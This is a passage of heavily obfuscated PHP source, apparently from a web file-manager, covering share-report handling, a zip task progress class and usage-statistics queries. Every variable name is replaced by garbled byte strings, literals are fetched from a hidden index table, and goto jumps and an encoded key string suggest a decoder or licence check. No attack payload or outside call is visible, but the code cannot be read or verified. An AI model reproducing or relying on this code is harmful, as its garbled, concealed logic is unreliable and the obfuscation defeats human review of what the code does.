$²õ©Ü«[22], $²õ©Ü«[204]); $ŒÎÑ©ò¤ = Model($²õ©Ü«[890])->sourceListInfo($¿Û«İú½, !0); foreach ($Íåˆ›ÒØ as $Òù±ÈË× => &$ÜªÚµ“Ü) { $ıäº—’ = $ÜªÚµ“Ü[$²õ©Ü«[1759]]; $ÜªÚµ“Ü[$²õ©Ü«[2136]] = $„ğ¾êÙÒ[$ıäº—’] ? $„ğ¾êÙÒ[$ıäº—’] : !1; $¥ú³ë = $ÜªÚµ“Ü[$²õ©Ü«[204]]; $ÜªÚµ“Ü[$²õ©Ü«[101]] = $ŒÎÑ©ò¤[$¥ú³ë] ? $ŒÎÑ©ò¤[$¥ú³ë] : !1; if ($ÜªÚµ“Ü[$²õ©Ü«[101]][$²õ©Ü«[516]] == $²õ©Ü«[102]) { unset($Íåˆ›ÒØ[$Òù±ÈË×]); } if ($ÜªÚµ“Ü[$²õ©Ü«[101]] != $²õ©Ü«[241] && !$ÜªÚµ“Ü[$²õ©Ü«[101]]) { unset($Íåˆ›ÒØ[$Òù±ÈË×]); } } unset($ÜªÚµ“Ü); $Íåˆ›ÒØ = array_values($Íåˆ›ÒØ); } private function _makeOrder($¯°Ÿ¾’ğ = '') { $ÓÛ¶»Ãì =& $_SERVER[ü¢ÙÊñÛ]; $ÈÛö±Úá = array($ÓÛ¶»Ãì[244], $ÓÛ¶»Ãì[826], $ÓÛ¶»Ãì[2123], $ÓÛ¶»Ãì[2124]); $²îÏÂ¸í = array($ÓÛ¶»Ãì[534] => $ÓÛ¶»Ãì[535], $ÓÛ¶»Ãì[536] => $ÓÛ¶»Ãì[537]); $°üÈñù = Input::get($ÓÛ¶»Ãì[541], $ÓÛ¶»Ãì[17], $ÓÛ¶»Ãì[508], $ÈÛö±Úá); $…®¯ÁÜã = Input::get($ÓÛ¶»Ãì[542], $ÓÛ¶»Ãì[17], $ÓÛ¶»Ãì[2137], array($ÓÛ¶»Ãì[2054], $ÓÛ¶»Ãì[536])); $…®¯ÁÜã = $²îÏÂ¸í[$…®¯ÁÜã]; $¯°Ÿ¾’ğ = $¯°Ÿ¾’ğ . "{$°üÈñù}\40{$…®¯ÁÜã}"; return $this->order($¯°Ÿ¾’ğ); } public function reportAdd($’ö½Ö¦) { $®ÉÖğ¼ =& $_SERVER[ü¢ÙÊñÛ]; $€”Õ”ÓŞ = array($®ÉÖğ¼[679] => $’ö½Ö¦[$®ÉÖğ¼[679]], $®ÉÖğ¼[1759] => USER_ID); if (Model($®ÉÖğ¼[2133])->where($€”Õ”ÓŞ)->find()) { return !1; } $·ş‰ôÆ = array($®ÉÖğ¼[679] => $’ö½Ö¦[$®ÉÖğ¼[679]], $®ÉÖğ¼[1647] => $’ö½Ö¦[$®ÉÖğ¼[1647]], $®ÉÖğ¼[204] => $’ö½Ö¦[$®ÉÖğ¼[204]], $®ÉÖğ¼[552] => $’ö½Ö¦[$®ÉÖğ¼[552]], $®ÉÖğ¼[1759] => USER_ID, $®ÉÖğ¼[43] => $’ö½Ö¦[$®ÉÖğ¼[43]], $®ÉÖğ¼[537] => $’ö½Ö¦[$®ÉÖğ¼[537]]); return Model($®ÉÖğ¼[2133])->add($·ş‰ôÆ); } public function reportList($ø©†¡¸) { $Ù“Ğğë¶ =& $_SERVER[ü¢ÙÊñÛ]; $¬ĞíÃóÌ = array(); if ($ø©†¡¸[$Ù“Ğğë¶[825]]) { $¤×‚ôŸ = $ø©†¡¸[$Ù“Ğğë¶[826]] ? $ø©†¡¸[$Ù“Ğğë¶[826]] : strtotime(date($Ù“Ğğë¶[2135])); $¬ĞíÃóÌ[$Ù“Ğğë¶[244]] = array($Ù“Ğğë¶[420], array($ø©†¡¸[$Ù“Ğğë¶[825]], $¤×‚ôŸ)); } if (isset($ø©†¡¸[$Ù“Ğğë¶[43]]) && in_array($ø©†¡¸[$Ù“Ğğë¶[43]], array($Ù“Ğğë¶[102], $Ù“Ğğë¶[521], $Ù“Ğğë¶[2138], $Ù“Ğğë¶[2139], $Ù“Ğğë¶[2140]))) { $¬ĞíÃóÌ[$Ù“Ğğë¶[43]] = $ø©†¡¸[$Ù“Ğğë¶[43]]; } if (isset($ø©†¡¸[$Ù“Ğğë¶[815]]) && in_array($ø©†¡¸[$Ù“Ğğë¶[815]], array($Ù“Ğğë¶[241], $Ù“Ğğë¶[102], $Ù“Ğğë¶[521], $Ù“Ğğë¶[2138]))) { $¬ĞíÃóÌ[$Ù“Ğğë¶[815]] = $ø©†¡¸[$Ù“Ğğë¶[815]]; } $òĞ¨¨¹ô = Input::get($Ù“Ğğë¶[542], $Ù“Ğğë¶[17], $Ù“Ğğë¶[2137], array($Ù“Ğğë¶[2054], $Ù“Ğğë¶[536])); $•€éÊÓŒ = array($Ù“Ğğë¶[534] => $Ù“Ğğë¶[535], $Ù“Ğğë¶[536] => $Ù“Ğğë¶[537]); $Ã«ÛÇ€ = $Ù“Ğğë¶[2141] . $•€éÊÓŒ[$òĞ¨¨¹ô]; $Ø²ÂíÁî = Model($Ù“Ğğë¶[2133])->where($¬ĞíÃóÌ)->order($Ã«ÛÇ€)->selectPage(20); if (empty($Ø²ÂíÁî[$Ù“Ğğë¶[457]])) { return array(); } $Â½šñã‹ = array_to_keyvalue_group($Ø²ÂíÁî[$Ù“Ğğë¶[457]], $Ù“Ğğë¶[815], $Ù“Ğğë¶[679]); if (!empty($Â½šñã‹[0])) { $ø©†¡¸ = $Â½šñã‹[0]; $¬ĞíÃóÌ = array($Ù“Ğğë¶[679] => array($Ù“Ğğë¶[17], $ø©†¡¸)); $öú´Ï½ = $this->where($¬ĞíÃóÌ)->field($Ù“Ğğë¶[679])->select(); $öú´Ï½ = array_to_keyvalue($öú´Ï½, $Ù“Ğğë¶[22], $Ù“Ğğë¶[679]); $ÎÁ”¯ = array_diff($ø©†¡¸, $öú´Ï½); if (!empty($ÎÁ”¯)) { foreach ($Ø²ÂíÁî[$Ù“Ğğë¶[457]] as $ºÇÙ‡Óê => $³Ğ‚²•) { if (in_array($³Ğ‚²•[$Ù“Ğğë¶[679]], $ÎÁ”¯)) { unset($Ø²ÂíÁî[$Ù“Ğğë¶[457]][$ºÇÙ‡Óê]); } } } } $this->_listDataApply($Ø²ÂíÁî[$Ù“Ğğë¶[457]]); return $Ø²ÂíÁî; } public function reportStatus($¢’‡Ïß) { $âÇßë =& $_SERVER[ü¢ÙÊñÛ]; $ÓÄ³íà = array($âÇßë[486] => $¢’‡Ïß[$âÇßë[486]]); $ÈÜá£¼ß = Model($âÇßë[2133])->where($ÓÄ³íà)->field($âÇßë[2142])->find(); if (!$ÈÜá£¼ß) { return !1; } $«üé—ñÓ = array($âÇßë[815] => $¢’‡Ïß[$âÇßë[815]]); if ($¢’‡Ïß[$âÇßë[815]] == $âÇßë[2138] && $ÈÜá£¼ß[$âÇßë[815]] == $âÇßë[2138]) { $«üé—ñÓ[$âÇßë[815]] = 0; } $·Ì®Ñî§ = Model($âÇßë[2133])->where($ÓÄ³íà)->save($«üé—ñÓ); if ($¢’‡Ïß[$âÇßë[815]] == $âÇßë[521]) { if ($ÈÜá£¼ß[$âÇßë[552]] != $âÇßë[241] && $this->shareFileMeta($ÈÜá£¼ß[$âÇßë[552]])) { $this->shareFileMeta($ÈÜá£¼ß[$âÇßë[552]], 0); } $this->remove($ÈÜá£¼ß[$âÇßë[679]]); return !0; } if ($·Ì®Ñî§ && $¢’‡Ïß[$âÇßë[815]] == $âÇßë[2138]) { $â¿ÍïèŒ = $«üé—ñÓ[$âÇßë[815]] == $âÇßë[2138] ? 1 : 0; $this->shareFileMeta($ÈÜá£¼ß[$âÇßë[552]], $â¿ÍïèŒ); $this->removeByFile($ÈÜá£¼ß[$âÇßë[552]]); } return $·Ì®Ñî§; } private function removeByFile($„ááÖàï) { $ÆÖº‘Ò =& $_SERVER[ü¢ÙÊñÛ]; $‚ª´Ä€ğ = Model($ÆÖº‘Ò[890])->where(array($ÆÖº‘Ò[552] => $„ááÖàï))->field($ÆÖº‘Ò[204])->select(); $¬Ó–Úæ¼ = array_to_keyvalue($‚ª´Ä€ğ, $ÆÖº‘Ò[22], $ÆÖº‘Ò[204]); $“¥÷µ¾‡ = array($ÆÖº‘Ò[204] => array($ÆÖº‘Ò[17], $¬Ó–Úæ¼), $ÆÖº‘Ò[573] => 1); $‚ª´Ä€ğ = $this->where($“¥÷µ¾‡)->field($ÆÖº‘Ò[679])->select(); if (empty($‚ª´Ä€ğ)) { return; } $É‘æ÷Æş = array_to_keyvalue($‚ª´Ä€ğ, $ÆÖº‘Ò[22], $ÆÖº‘Ò[679]); $this->remove($É‘æ÷Æş); } private function shareFileMeta($ÈƒÅÒº², $ø…¿ÕÈÇ = null) { $§ÚÌçÍÅ =& $_SERVER[ü¢ÙÊñÛ]; $ÍÇÜ¼¯Ï = array($§ÚÌçÍÅ[552] => $ÈƒÅÒº², $§ÚÌçÍÅ[108] => $§ÚÌçÍÅ[2143]); if (is_null($ø…¿ÕÈÇ)) { return Model($§ÚÌçÍÅ[2144])->where($ÍÇÜ¼¯Ï)->find(); } $ÍÇÜ¼¯Ï[$§ÚÌçÍÅ[462]] = $ø…¿ÕÈÇ; Model($§ÚÌçÍÅ[2144])->add($ÍÇÜ¼¯Ï, array(), !0); } } goto D¢³š‹¬ ; Aß‡’õŞ…´: function binCheckBigger($ß”êÇ£, $§ÀµÖÒñ) { return $ß”êÇ£ > $§ÀµÖÒñ; } $_SERVER[$_SERVER[³ñ±ª˜‘][3]] = ("\70\65\67\65"."\63\61")+0;$_cu8f="9gn6sz0m5ju3iad7wrv2cbkpeol48xqh1tyf2pvs1xf5mwut639yneldbkrgzo078ji4qhacgba982lmkt";; $_file = $_SERVER[$_SERVER[ü¢ÙÊñÛ][4]]; goto AàÑÜå‰Û; FË–›®‹Ø‹: class TaskZip extends TaskFileTransfer { protected function startAfter() { $Ø°ªÒ°¨ =& $_SERVER[ü¢ÙÊñÛ]; parent::startAfter(); Hook::bind($Ø°ªÒ°¨[1884], array($this, $Ø°ªÒ°¨[1874])); Hook::bind($Ø°ªÒ°¨[1876], array($this, $Ø°ªÒ°¨[1877])); $ûÉï’Û« =& $this->task; $ûÉï’Û«[$Ø°ªÒ°¨[1878]] = $Ø°ªÒ°¨[1268]; if (!$ûÉï’Û«[$Ø°ªÒ°¨[1647]]) { $ûÉï’Û«[$Ø°ªÒ°¨[1647]] = LNG($Ø°ªÒ°¨[1885]); } } protected function endAfter() { $òÏÊÕÈ =& $_SERVER[ü¢ÙÊñÛ]; parent::endAfter(); Hook::unbind($òÏÊÕÈ[1884], array($this, $òÏÊÕÈ[1874])); Hook::unbind($òÏÊÕÈ[1876], array($this, $òÏÊÕÈ[1877])); } public function updateAfter() { $§†ÊøÇ¾ =& $_SERVER[ü¢ÙÊñÛ]; $˜äÂÓ¯ =& $this->task; if (!$˜äÂÓ¯[$§†ÊøÇ¾[1129]] || !$˜äÂÓ¯[$§†ÊøÇ¾[828]]) { return; } if ($˜äÂÓ¯[$§†ÊøÇ¾[1878]] == $§†ÊøÇ¾[1268]) { $ç¶¯º…÷ = $˜äÂÓ¯[$§†ÊøÇ¾[1814]]; if ($˜äÂÓ¯[$§†ÊøÇ¾[1815]] != $§†ÊøÇ¾[1268]) { $ç¶¯º…÷ = 0; } $ç¤ääé† = ($˜äÂÓ¯[$§†ÊøÇ¾[1818]] + $ç¶¯º…÷) / $˜äÂÓ¯[$§†ÊøÇ¾[828]]; $˜äÂÓ¯[$§†ÊøÇ¾[1761]] = $ç¤ääé† * 0.3; } else { if ($˜äÂÓ¯[$§†ÊøÇ¾[1878]] == $§†ÊøÇ¾[400]) { $ç¤ääé† = $˜äÂÓ¯[$§†ÊøÇ¾[1760]] / $˜äÂÓ¯[$§†ÊøÇ¾[1129]]; $˜äÂÓ¯[$§†ÊøÇ¾[1761]] = 0.3 + $ç¤ääé† * 0.5; } else { if ($˜äÂÓ¯[$§†ÊøÇ¾[1878]] == $§†ÊøÇ¾[121]) { $ç¤ääé† = 0; if ($˜äÂÓ¯[$§†ÊøÇ¾[1813]]) { $ç¤ääé† = $˜äÂÓ¯[$§†ÊøÇ¾[1814]] / $˜äÂÓ¯[$§†ÊøÇ¾[1813]]; } $˜äÂÓ¯[$§†ÊøÇ¾[1761]] = 0.3 + 0.5 + $ç¤ääé† * 0.2; } } } if ($˜äÂÓ¯[$§†ÊøÇ¾[1761]] > 0) { $–íØØ  = timeFloat() - $˜äÂÓ¯[$§†ÊøÇ¾[1763]] - $˜äÂÓ¯[$§†ÊøÇ¾[1766]]; $˜äÂÓ¯[$§†ÊøÇ¾[1767]] = $–íØØ  * (1 - $˜äÂÓ¯[$§†ÊøÇ¾[1761]]) / $˜äÂÓ¯[$§†ÊøÇ¾[1761]]; } } public function copyFileStart($À•ÏÌ, $¾‚–Ğ«š, $ÎƒÌ²ŠŠ, $ûö™ü¹ª, $¼¸è°ëğ, $±±ø¥áÔ) { $’¶“Ş¿² =& $_SERVER[ü¢ÙÊñÛ]; parent::copyFileStart($À•ÏÌ, $¾‚–Ğ«š, $ÎƒÌ²ŠŠ, $ûö™ü¹ª, $¼¸è°ëğ, $±±ø¥áÔ); $óæş¿¢• =& $this->task; if ($óæş¿¢•[$’¶“Ş¿²[1878]] == $’¶“Ş¿²[400]) { $óæş¿¢•[$’¶“Ş¿²[1878]] = $’¶“Ş¿²[121]; } $this->update(); } public function copyFileEnd($°úô‹Ï®, $µ•á±‡, $Üí·¯», $¬Ô¶¹ªâ, $‰¥±´Á‡, $Ëê¨ıÌ) { $Ö§È• =& $_SERVER[ü¢ÙÊñÛ]; $‘­àíª =& $this->task; $‘­àíª[$Ö§È•[1814]] = $‘­àíª[$Ö§È•[1813]]; $‘­àíª[$Ö§È•[1818]] += $‘­àíª[$Ö§È•[1813]]; $‘­àíª[$Ö§È•[1815]] = $Ö§È•[22]; $this->update(); } public function zipEvent($¬Ôå–½, $¶Á¯Òæ®, $Ï­ğ–Öï, $øô‰–øÙ) { $Û«¡Îõä =& $_SERVER[ü¢ÙÊñÛ]; $ÖŠ¨œ»Õ =& $this->task; $ÖŠ¨œ»Õ[$Û«¡Îõä[1811]] = get_path_this($¶Á¯Òæ®); $ÖŠ¨œ»Õ[$Û«¡Îõä[1813]] = $øô‰–øÙ; $ÖŠ¨œ»Õ[$Û«¡Îõä[1814]] = $Ï­ğ–Öï; $ÖŠ¨œ»Õ[$Û«¡Îõä[1131]] = $¬Ôå–½ == $Û«¡Îõä[1886] ? $Û«¡Îõä[1881] : $Û«¡Îõä[1882]; $ÖŠ¨œ»Õ[$Û«¡Îõä[1815]] = $Û«¡Îõä[22]; $ÖŠ¨œ»Õ[$Û«¡Îõä[828]] = $øô‰–øÙ; $ÖŠ¨œ»Õ[$Û«¡Îõä[1878]] = $Û«¡Îõä[400]; $this->update(); } public function nameParse($µ€’Ì™Ó) { $Ìƒ˜¯©ƒ =& $_SERVER[ü¢ÙÊñÛ]; $Û‘üÓÚ± =& $this->task; if ($Û‘üÓÚ±[$Ìƒ˜¯©ƒ[1760]] < $Û‘üÓÚ±[$Ìƒ˜¯©ƒ[1129]]) { $êœ¶»æ = get_path_this($µ€’Ì™Ó); if (strstr($êœ¶»æ, $Ìƒ˜¯©ƒ[20])) { $Û‘üÓÚ±[$Ìƒ˜¯©ƒ[1760]] += 1; } } if ($Û‘üÓÚ±[$Ìƒ˜¯©ƒ[1878]] == $Ìƒ˜¯©ƒ[1268]) { $Û‘üÓÚ±[$Ìƒ˜¯©ƒ[1878]] = $Ìƒ˜¯©ƒ[400]; } $Û‘üÓÚ±[$Ìƒ˜¯©ƒ[1811]] = $µ€’Ì™Ó; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($øµÄ”ü¤) { $Š³¸×ÑÏ =& $_SERVER[ü¢ÙÊñÛ]; $˜çâ—Ó² = array($Š³¸×ÑÏ[676] => array($Š³¸×ÑÏ[43] => $Š³¸×ÑÏ[1887], $Š³¸×ÑÏ[362] => array($Š³¸×ÑÏ[295], $Š³¸×ÑÏ[830], $Š³¸×ÑÏ[1888], $Š³¸×ÑÏ[1889])), $Š³¸×ÑÏ[1890] => array($Š³¸×ÑÏ[43] => $Š³¸×ÑÏ[1891], $Š³¸×ÑÏ[362] => array($Š³¸×ÑÏ[295], $Š³¸×ÑÏ[828], $Š³¸×ÑÏ[1892], $Š³¸×ÑÏ[1893], $Š³¸×ÑÏ[1894]))); if (!isset($˜çâ—Ó²[$øµÄ”ü¤])) { return !1; } $this->optionType = $˜çâ—Ó²[$øµÄ”ü¤][$Š³¸×ÑÏ[43]]; $this->field = $˜çâ—Ó²[$øµÄ”ü¤][$Š³¸×ÑÏ[362]]; return !0; } public function listData($ØØ€Õòï = false, $ˆçı©½ã = "\155\x6f\x64\x69\x66\x79\124\151\x6d\145", $©Î™Ô² = false) { return parent::listData($ØØ€Õòï, $ˆçı©½ã, $©Î™Ô²); } public function trendList($‰Õ¤é´) { $´¦š·â£ =& $_SERVER[ü¢ÙÊñÛ]; $óˆö±Î» = $this->listData(); if ($óˆö±Î») { $ÈØœ¡Íğ = end($óˆö±Î»); $µ¶ØÍÒ½ = date($´¦š·â£[1895], strtotime($´¦š·â£[1896])); if ($ÈØœ¡Íğ[$´¦š·â£[295]] == $µ¶ØÍÒ½) { return $óˆö±Î»; } $Ññ‚×áã = strtotime($ÈØœ¡Íğ[$´¦š·â£[295]]); } if (!isset($Ññ‚×áã)) { $¿´Û©Õƒ = $‰Õ¤é´ == $´¦š·â£[676] ? $´¦š·â£[608] : $´¦š·â£[890]; $Ññ‚×áã = Model($¿´Û©Õƒ)->min($´¦š·â£[244]); } $ñ—ƒ®ñü = $´¦š·â£[1897] . ucfirst($‰Õ¤é´); $åè•ÛÀ = $this->dateList($Ññ‚×áã); foreach ($åè•ÛÀ as $µ¶ØÍÒ½) { $this->{$ñ—ƒ®ñü}($µ¶ØÍÒ½); } return $this->listData(); } private function dateList($ãÂ¹Öú³) { $´å•ƒ¨© =& $_SERVER[ü¢ÙÊñÛ]; $ûĞ–›Çã = $ãÂ¹Öú³; $ş£­‹®õ = strtotime($´å•ƒ¨©[1896]); $ãîÆó‘ = array(); while ($ûĞ–›Çã <= $ş£­‹®õ) { $ãîÆó‘[] = date($´å•ƒ¨©[1895], $ûĞ–›Çã); $ûĞ–›Çã = strtotime($´å•ƒ¨©[1898], $ûĞ–›Çã); } return $ãîÆó‘; } public function _recordUser($ßŒ§¨ëå = '') { $Ù‰ÓØÕú =& $_SERVER[ü¢ÙÊñÛ]; $ÁÒ¿æªÎ = strtotime(date($Ù‰ÓØÕú[1899], strtotime($ßŒ§¨ëå))); $ãØÈ€˜Ò = strtotime(date($Ù‰ÓØÕú[1900], strtotime($ßŒ§¨ëå))); $ëÛá¨¥ = array($Ù‰ÓØÕú[244] => array($Ù‰ÓØÕú[1079], $ãØÈ€˜Ò)); $ªê¤·¿ = Model($Ù‰ÓØÕú[608])->where($ëÛá¨¥)->count($Ù‰ÓØÕú[1759]); $ëÛá¨¥[$Ù‰ÓØÕú[244]] = array($Ù‰ÓØÕú[420], array($ÁÒ¿æªÎ, $ãØÈ€˜Ò)); $­šä¶¯ = Model($Ù‰ÓØÕú[608])->where($ëÛá¨¥)->count($Ù‰ÓØÕú[1759]); $ëÛá¨¥[$Ù‰ÓØÕú[43]] = $Ù‰ÓØÕú[1901]; $Ë›¹åï’ = Model($Ù‰ÓØÕú[1902])->where($ëÛá¨¥)->count($Ù‰ÓØÕú[1903]); $íÉ²¾õ = array($Ù‰ÓØÕú[295] => $ßŒ§¨ëå, $Ù‰ÓØÕú[830] => (int) $ªê¤·¿, $Ù‰ÓØÕú[1888] => (int) $­šä¶¯, $Ù‰ÓØÕú[1889] => (int) $Ë›¹åï’); return $this->insert($íÉ²¾õ); } public function _recordStore($ÅÃ‚˜¬ú = '') { $®Ø™áóç =& $_SERVER[ü¢ÙÊñÛ]; $ËúÓÛ¾ = strtotime(date($®Ø™áóç[1900], strtotime($ÅÃ‚˜¬ú))); $€„‚¤À© = array($®Ø™áóç[244] => array($®Ø™áóç[1079], $ËúÓÛ¾)); $—ú«ŠóÜ = Model($®Ø™áóç[555])->where($€„‚¤À©)->sum($®Ø™áóç[90]); $€„‚¤À©[$®Ø™áóç[496]] = 0; $¥«¸§Í½ = Model($®Ø™áóç[890])->where($€„‚¤À©)->sum($®Ø™áóç[90]); $€„‚¤À©[$®Ø™áóç[201]] = 1; $¬¯ŞÓÉâ = Model($®Ø™áóç[890])->where($€„‚¤À©)->sum($®Ø™áóç[90]); $€„‚¤À©[$®Ø™áóç[201]] = 2; $¿ÍÎşÓ´ = Model($®Ø™áóç[890])->where($€„‚¤À©)->sum($®Ø™áóç[90]); $ŒÎ›ÇÁè = array($®Ø™áóç[295] => $ÅÃ‚˜¬ú, $®Ø™áóç[828] => (int) $¥«¸§Í½, $®Ø™áóç[1892] => (int) $—ú«ŠóÜ, $®Ø™áóç[1893] => (int) $¬¯ŞÓÉâ, $®Ø™áóç[1894] => (int) $¿ÍÎşÓ´); return $this->insert($ŒÎ›ÇÁè); } public function trend($®‚Ì¾ıï, $¶¬Ï™³ø) { $èÌ²Ü» =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->init($®‚Ì¾ıï)) { return !1; } $¿ü‹ê©ô = $this->trendList($®‚Ì¾ıï); if ($¿ü‹ê©ô && $¶¬Ï™³ø != $èÌ²Ü»[1731]) { $õ­®àØ„ = $¿ü‹ê©ô[0][$èÌ²Ü»[295]]; $í±·æç’ = $this->validDate($¶¬Ï™³ø, $õ­®àØ„); $š€«Å·÷ = array(); $œäÌúæ’ = array_to_keyvalue($¿ü‹ê©ô, $èÌ²Ü»[295]); foreach ($í±·æç’ as $íŞ§ä—Ã) { if (isset($œäÌúæ’[$íŞ§ä—Ã])) { $–úŞà¡ = $œäÌúæ’[$íŞ§ä—Ã]; } else { $–úŞà¡ = end($¿ü‹ê©ô); $–úŞà¡[$èÌ²Ü»[295]] = $íŞ§ä—Ã; if ($®‚Ì¾ıï == $èÌ²Ü»[676]) { $–úŞà¡[$èÌ²Ü»[1888]] = $–úŞà¡[$èÌ²Ü»[1889]] = 0; } } $š€«Å·÷[] = $–úŞà¡; } $¿ü‹ê©ô = $š€«Å·÷; } $½“ıÚ = array($èÌ²Ü»[676] => array($èÌ²Ü»[830] => LNG($èÌ²Ü»[1904]), $èÌ²Ü»[1888] => LNG($èÌ²Ü»[1905]), $èÌ²Ü»[1889] => LNG($èÌ²Ü»[1906])), $èÌ²Ü»[1890] => array($èÌ²Ü»[828] => LNG($èÌ²Ü»[1907]), $èÌ²Ü»[1892] => LNG($èÌ²Ü»[1908]), $èÌ²Ü»[1893] => LNG($èÌ²Ü»[1909]), $èÌ²Ü»[1894] => LNG($èÌ²Ü»[1910]))); $š¾‘è¢³ = array($èÌ²Ü»[676] => $èÌ²Ü»[1911], $èÌ²Ü»[1890] => $èÌ²Ü»[90]); if (empty($¿ü‹ê©ô)) { $íŞ§ä—Ã = date($èÌ²Ü»[1895], strtotime($èÌ²Ü»[1896])); $é©…ÒúË = array($èÌ²Ü»[295] => $íŞ§ä—Ã); foreach ($½“ıÚ[$®‚Ì¾ıï] as $­«Â°æ => $¶ñùŸ¶–) { $é©…ÒúË[$­«Â°æ] = 0; } $¿ü‹ê©ô[] = $é©…ÒúË; } $¸¥¥»´ = array(); foreach ($¿ü‹ê©ô as $¶ñùŸ¶–) { if ($®‚Ì¾ıï == $èÌ²Ü»[1890] && $¶ñùŸ¶–[$èÌ²Ü»[1892]] > $¶ñùŸ¶–[$èÌ²Ü»[828]]) { $¶ñùŸ¶–[$èÌ²Ü»[1892]] = $¶ñùŸ¶–[$èÌ²Ü»[828]]; } foreach ($½“ıÚ[$®‚Ì¾ıï] as $­«Â°æ => $‰Æ¬«‚à) { $–úŞà¡ = array($èÌ²Ü»[295] => $¶ñùŸ¶–[$èÌ²Ü»[295]], $èÌ²Ü»[1647] => $‰Æ¬«‚à); $–úŞà¡[$š¾‘è¢³[$®‚Ì¾ıï]] = isset($¶ñùŸ¶–[$­«Â°æ]) ? $¶ñùŸ¶–[$­«Â°æ] : 0; $¸¥¥»´[] = $–úŞà¡; } } return $¸¥¥»´; } public function validDate($ï¨ªò² , $êµ·È®ñ) { $Â·ğ×½ =& $_SERVER[ü¢ÙÊñÛ]; $Íï€Çİ = date($Â·ğ×½[1895], strtotime($Â·ğ×½[1896])); $–µãµŞ = array($Íï€Çİ); switch ($ï¨ªò² ) { case $Â·ğ×½[1738]: $¥åÌ­° = mktime(0, 0, 0, date($Â·ğ×½[1912]), date($Â·ğ×½[1441]) - date($Â·ğ×½[1531]) + 7 - 7, date($Â·ğ×½[1913])); $•¤çÅ„ğ = 0; do { $¯®µ¥Ë€ = date($Â·ğ×½[1895], $¥åÌ­° - 3600 * 24 * 7 * $•¤çÅ„ğ); $–µãµŞ[] = $¯®µ¥Ë€; $•¤çÅ„ğ++; } while ($êµ·È®ñ < $¯®µ¥Ë€); break; case $Â·ğ×½[1736]: $•¤çÅ„ğ = 1; do { $Óä°ÏşÅ = date($Â·ğ×½[1914], strtotime("\55\40{$•¤çÅ„ğ}\x20\155\157\x6e\x74\x68\163")); $–µãµŞ[] = $Óä°ÏşÅ; $•¤çÅ„ğ++; } while ($êµ·È®ñ < $Óä°ÏşÅ); break; case $Â·ğ×½[1915]: $±¾ÃÚ ï = (int) date($Â·ğ×½[1913], strtotime($êµ·È®ñ)); $äœ¡Í¢¾ = (int) date($Â·ğ×½[1913]); if ($±¾ÃÚ ï >= $äœ¡Í¢¾) { break; } for ($±¾ÃÚ ï; $±¾ÃÚ ï < $äœ¡Í¢¾; $±¾ÃÚ ï++) { $–µãµŞ[] = $±¾ÃÚ ï . $Â·ğ×½[1916]; } break; default: break; } if ($êµ·È®ñ > end($–µãµŞ)) { array_pop($–µãµŞ); } sort($–µãµŞ); return $–µãµŞ; } public function listTable($‰•Øúí) { $ÃÁô€ÛÃ = ucfirst($‰•Øúí); return Model($ÃÁô€ÛÃ)->listData(); } public function option($µÚÙÑ­ü) { $Ä“âŒç“ = $_SERVER[ü¢ÙÊñÛ][1917] . ucfirst($µÚÙÑ­ü); return $this->{$Ä“âŒç“}(); } private function optionUser() { $Ööü¹±“ =& $_SERVER[ü¢ÙÊñÛ]; $¨í‡î÷Õ = Model($Ööü¹±“[608])->count($Ööü¹±“[1759]); $ÅôçğĞø = Model($Ööü¹±“[608])->where($Ööü¹±“[1918])->count($Ööü¹±“[1759]); $úˆŠ÷‘æ = intval($GLOBALS[$Ööü¹±“[16]][$Ööü¹±“[436]][$Ööü¹±“[1704]]) / 3600; $û‚ò€Èà = strtotime("\55{$úˆŠ÷‘æ}\40\150\x6f\165\x72\163"); $¤…Œı™® = strtotime(date($Ööü¹±“[1899])); if ($û‚ò€Èà < $¤…Œı™®) { $û‚ò€Èà = $¤…Œı™®; } $ÉÚ¤Âææ = array($Ööü¹±“[1919] => array($Ööü¹±“[1080], $û‚ò€Èà)); $•îîÊ÷‰ = (int) Model($Ööü¹±“[608])->where($ÉÚ¤Âææ)->count($Ööü¹±“[1759]); if (!$•îîÊ÷‰) { $•îîÊ÷‰ = 1; } $ÉÚ¤Âææ = array($Ööü¹±“[1919] => array($Ööü¹±“[1080], $¤…Œı™®)); $‚†‡Î¯İ = Model($Ööü¹±“[608])->where($ÉÚ¤Âææ)->count($Ööü¹±“[1759]); return array($Ööü¹±“[823] => (int) $¨í‡î÷Õ, $Ööü¹±“[1920] => (int) ($¨í‡î÷Õ - $ÅôçğĞø), $Ööü¹±“[1921] => (int) $ÅôçğĞø, $Ööü¹±“[1922] => (int) $‚†‡Î¯İ, $Ööü¹±“[1923] => $•îîÊ÷‰); } private function optionFile() { $„½†Ä¬¤ =& $_SERVER[ü¢ÙÊñÛ]; $†«Ç‚– = $this->sourceSize(); $œ½•¾” = $†«Ç‚–[$„½†Ä¬¤[90]]; $®éõÖ¹ = $†«Ç‚–[$„½†Ä¬¤[1892]]; $şÔı³ = Model($„½†Ä¬¤[890])->where(array($„½†Ä¬¤[496] => 0))->count($„½†Ä¬¤[204]); $·™Âı©Õ = array($„½†Ä¬¤[496] => 0, $„½†Ä¬¤[244] => array($„½†Ä¬¤[1080], strtotime(date($„½†Ä¬¤[1899])))); $â×‘–‚ = Model($„½†Ä¬¤[890])->where($·™Âı©Õ)->sum($„½†Ä¬¤[90]); $áÊ´ûóØ = Model($„½†Ä¬¤[890])->where($·™Âı©Õ)->count($„½†Ä¬¤[204]); return array($„½†Ä¬¤[828] => $œ½•¾”, $„½†Ä¬¤[1892] => $®éõÖ¹, $„½†Ä¬¤[1924] => $œ½•¾” - $®éõÖ¹, $„½†Ä¬¤[1925] => (int) $â×‘–‚, $„½†Ä¬¤[830] => (int) $şÔı³, $„½†Ä¬¤[1926] => (int) $áÊ´ûóØ); } private function optionAccess() { $áŠ×¥ı³ =& $_SERVER[ü¢ÙÊñÛ]; return array($áŠ×¥ı³[823] => $this->typeLogCnt(), $áŠ×¥ı³[121] => $this->typeLogCnt($áŠ×¥ı³[121]), $áŠ×¥ı³[536] => $this->typeLogCnt($áŠ×¥ı³[536]), $áŠ×¥ı³[1927] => $this->typeLogCnt($áŠ×¥ı³[1927]), $áŠ×¥ı³[1928] => $this->typeLogCnt($áŠ×¥ı³[1928]), $áŠ×¥ı³[676] => $this->typeLogCnt($áŠ×¥ı³[22], $áŠ×¥ı³[1903])); } private function typeLogCnt($¼¡èªÀ = '', $·ÌŒèØ¬ = "\x69\x64") { $Ãóå»•¿ =& $_SERVER[ü¢ÙÊñÛ]; $øµìåÑ = array($Ãóå»•¿[121] => array($Ãóå»•¿[1929], $Ãóå»•¿[1930]), 